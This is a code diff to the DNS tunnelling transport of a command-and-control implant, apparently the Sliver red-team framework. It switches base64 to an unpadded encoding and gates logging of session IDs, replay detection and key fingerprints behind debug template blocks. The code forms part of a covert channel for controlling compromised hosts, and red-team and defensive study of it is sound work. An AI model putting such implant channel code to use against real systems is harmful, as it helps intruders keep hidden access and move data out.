@@ -78,10 +78,13 @@ type BlockReassembler struct {
 func isReplayAttack(ciphertext []byte) bool {
 	sha := sha256.New()
 	sha.Write(ciphertext)
-	digest := base64.StdEncoding.EncodeToString(sha.Sum(nil))
+	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
 	replayMutex.Lock()
 	defer replayMutex.Unlock()
 	if _, ok := (*replay)[digest]; ok {
+		// {{if .Debug}}
+		log.Printf("WARNING: Replay attack detected")
+		// {{end}}
 		return true
 	}
 	(*replay)[digest] = true
@@ -206,8 +209,14 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	if err != nil {
 		return "", AESKey{}, errors.New("Failed to start new DNS session")
 	}
-	encryptedSessionIDData, err := base64.StdEncoding.DecodeString(encryptedSessionID)
+	// {{if .Debug}}
+	log.Printf("Encrypted session id = %s", encryptedSessionID)
+	// {{end}}
+	encryptedSessionIDData, err := base64.RawStdEncoding.DecodeString(encryptedSessionID)
 	if err != nil || isReplayAttack(encryptedSessionIDData) {
+		// {{if .Debug}}
+		log.Printf("Session ID decode error %v", err)
+		// {{end}}
 		return "", AESKey{}, errors.New("Failed to decode session id")
 	}
 	sessionID, err := GCMDecrypt(sessionKey, encryptedSessionIDData)
@@ -235,7 +244,9 @@ func dnsGetServerPublicKey() *rsa.PublicKey {
 		// {{end}}
 		return nil
 	}
+	// {{if .Debug}}
 	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
+	// {{end}}
 
 	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
@@ -483,11 +494,12 @@ func sessionEncrypt(sessionKey AESKey, data []byte) string {
 
 func fingerprintSHA256(block *pem.Block) string {
 	hash := sha256.Sum256(block.Bytes)
-	b64hash := base64.StdEncoding.EncodeToString(hash[:])
+	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
 	return strings.TrimRight(b64hash, "=")
 }
 
 // --------------------------- ENCODER ---------------------------
+
 var base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"
 var sliverBase32 = base32.NewEncoding(base32Alphabet)
 
